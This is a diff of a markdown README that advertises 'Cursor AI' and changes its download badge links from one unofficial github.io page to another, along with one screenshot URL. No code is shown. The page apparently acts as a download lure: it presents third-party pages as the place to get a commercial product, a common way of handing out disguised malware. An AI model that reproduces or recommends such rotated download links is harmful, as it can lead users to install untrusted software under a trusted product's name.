@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/cursorAI">
+  <a href="https://polycia-apps.github.io/.github/cursorAI">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Cursor AI"/>
   </a>
 </p>
@@ -59,7 +59,7 @@ The <a href="#cursorAI">refactoring and maintenance use case</a> uses Cursor's m
 ---
 
 <p align="center">
-  <img src="https://cdn.prod.website-files.com/6542d8f9e468531067fe9978/68711ec046bc57b16a1c2b59_AD_4nXcbLPspUVHKY2FIAAM3f6YwpINeGuInGWL5YCePY7oVm5kDP1olRjBkkrmMJZEZh0kaklgCyocgjay5_mVdyntenmH0mTsQ.webp" alt="Cursor AI screenshot 2"/>
+  <img src="https://docs.gaianet.ai/assets/images/cursor-02-28b91f7d5e5c8be2cf75d3b8d3333184.png" alt="Cursor AI screenshot 2"/>
 </p>
 
 ## 📍 Where It's Useful & Additional Information
@@ -81,7 +81,7 @@ The Composer multi-file editing capability represents the qualitative jump from 
 
 <p align="center">
 
-[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/cursorAI)
+[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/cursorAI)
 
 </p>
 
